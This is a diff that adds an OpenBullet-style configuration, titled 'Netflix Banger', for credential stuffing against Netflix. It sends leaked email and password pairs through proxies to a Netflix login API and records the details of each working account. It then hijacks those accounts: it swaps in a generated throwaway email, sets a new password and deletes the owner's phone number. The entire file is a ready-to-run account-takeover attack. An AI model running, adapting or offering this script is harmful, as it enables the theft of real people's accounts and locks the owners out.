@@ -1,0 +1,119 @@
+[SETTINGS]
+{
+  "Name": "Netflix Banger",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-07T16:21:56.6989698+07:00",
+  "AdditionalInfo": "Change Email + Pass & Delete Num! Credits goes to Forlax",
+  "Author": "Forlax",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#CREDIT_FORLAX REQUEST POST "https://api-global.netflix.com/iosui/user/9.0" AutoRedirect=FALSE 
+  CONTENT "appInternalVersion=9.0.0&appVersion=9.0.0&callPath=[\"moneyball\",\"appleSignUp\",\"next\"]&device_type=NFAPPL-02-&idiom=phone&iosVersion=11.3&isTablet=false&kids=false&maxDeviceWidth=320&method=call&model=saget&modelType=IPHONE8-4&odpAware=true&param={\"action\":\"loginAction\",\"fields\":{\"email\":\"<USER>\",\"rememberMe\":\"true\",\"password\":\"<PASS>\"},\"verb\":\"POST\",\"mode\":\"login\",\"flow\":\"appleSignUp\"}&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Argo/9.0.2 (iPhone; iOS 11.3; Scale/2.00)" 
+  HEADER "Pragma: no-cache" 
+#IF_YOU_GONNA_USE_IT KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "CURRENT_MEMBER" 
+    KEY "\"mode\":\"memberHome\"," 
+  KEYCHAIN Failure OR 
+    KEY "\"mode\":\"login\"," 
+    KEY "throttling_failure" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"mode\":\"welcome\"," 
+  KEYCHAIN Success OR 
+    KEY "\"mode\":\"memberHome\"," 
+    KEY "CURRENT_MEMBER" 
+  KEYCHAIN Ban OR 
+    KEY "throttling_failure" 
+    KEY "Invalid Request" 
+  KEYCHAIN Retry OR 
+    KEY "postDyscom" 
+#IN_A_CHECKER REQUEST GET "https://www.netflix.com/youraccount?nftoken=" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Subscription PARSE "<SOURCE>" LR "\"membershipStatus\":\"" "\"," Recursive=FALSE -> CAP "Subscription" "" "" 
+#Country PARSE "<SOURCE>" LR "\"countryOfSignup\":\"" "\",\"" Recursive=FALSE -> VAR "Country" "" "" 
+#DVD PARSE "<SOURCE>" LR "\"isDVD\":" "," Recursive=FALSE -> CAP "DVD" "" "" 
+#PARSEauthURL PARSE "<SOURCE>" LR "\"authURL\":\"" "\",\"isDVD\"" Recursive=FALSE -> VAR "authUrlValueTest" "" "" 
+#FIXauth FUNCTION Replace "\x2F" "/" UseRegex=FALSE "<authUrlValueTest>" -> VAR "Fixedauth" 
+#FIXauth2 FUNCTION Replace "\x2B" "+" UseRegex=FALSE "<Fixedauth>" -> VAR "Fixedauth2" 
+#FIXauth3 FUNCTION Replace "\x3D" "=" UseRegex=FALSE "<Fixedauth2>" -> VAR "Fixedauth3" 
+PARSE "<Fixedauth3>" LR "" "" Recursive=FALSE -> VAR "authUrlValue" "" "" 
+#Trial PARSE "<SOURCE>" LR "\"isInFreeTrial\":" "," Recursive=FALSE -> VAR "Trial" "" "" 
+#Screens PARSE "<SOURCE>" LR "\"maxStreams\":" "," Recursive=FALSE -> CAP "Screens" "" "" 
+#HD PARSE "<SOURCE>" LR "\"hasHD\":" "," Recursive=FALSE -> VAR "HD" "" "" 
+#Ultra_HD PARSE "<SOURCE>" LR "\"hasUHD\":" "," Recursive=FALSE -> VAR "Ultra HD" "" "" 
+#GETbillingDate PARSE "<SOURCE>" LR "\"nextBillingDate\":\"" "\"" Recursive=FALSE -> VAR "BillingDate" "" "" 
+#FIXbillingDate FUNCTION Replace "\x2F" "\" UseRegex=FALSE "<BillingDate>" -> VAR "NEWbillingdate" 
+#Next_billing PARSE "<NEWbillingdate>" LR "\"nextBillingDate\":\"" "\"" Recursive=FALSE -> CAP "Next billing" "" "" 
+#REQUESTemail REQUEST GET "http://www.yopmail.com/en/email-generator.php" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Host: www.yopmail.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+#PARSEemail PARSE "<SOURCE>" LR "readonly=\"readonly\" onmouseup=\"this.select();\" type=\"text\" value=\"" "\"/>" Recursive=FALSE -> VAR "TESTemail" "" "" 
+#randomNum FUNCTION RandomNum 11 99 "" -> VAR "tempNum" 
+#randomNum FUNCTION RandomNum 54 99 "" -> VAR "tempNum2" 
+#getPASS FUNCTION Replace "&#64;yopmail.com" "<tempNum2>FRLX" UseRegex=TRUE "<TESTemail>" -> VAR "NEWpass" 
+#FIXemail FUNCTION Replace "&#64;yopmail.com" "<tempNum>@forlax<tempNum>.com" UseRegex=TRUE "<TESTemail>" -> VAR "NEWemail" 
+#PARSEFIXemail PARSE "<NEWemail>" LR "" "" Recursive=FALSE -> CAP "EMAIL" "" "" 
+#PARSEFIXpass PARSE "<NEWpass>" LR "" "" Recursive=FALSE -> CAP "Password:" "" "" 
+#CHANGEpass REQUEST POST "https://www.netflix.com/api/shakti/v7cfeb7b7/account/info" AutoRedirect=FALSE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"pw_new\":\"<NEWpass>\",\"pw_confirm\":\"<NEWpass>\",\"signout_devices\":false,\"authURL\":\"<authUrlValue>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.netflix.com/password" 
+  HEADER "Origin: https://www.netflix.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.netflix.com" 
+#CHANGEemail REQUEST POST "https://www.netflix.com/api/shakti/v7cfeb7b7/account/info" AutoRedirect=FALSE 
+  CONTENT "{\"emailAddress\":\"<NEWemail>\",\"password\":\"<NEWpass>\",\"authURL\":\"<authUrlValue>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.netflix.com/email" 
+  HEADER "Origin: https://www.netflix.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.netflix.com" 
+#DELETEphone REQUEST POST "https://www.netflix.com/api/shakti/v447a9423/account/phonenumber" AutoRedirect=FALSE 
+  CONTENT "{\"password\":\"<NEWpass>\",\"action\":\"delete\",\"authURL\":\"<authUrlValue>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.netflix.com/phonenumber" 
+  HEADER "Origin: https://www.netflix.com" 
+  HEADER "Host: www.netflix.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
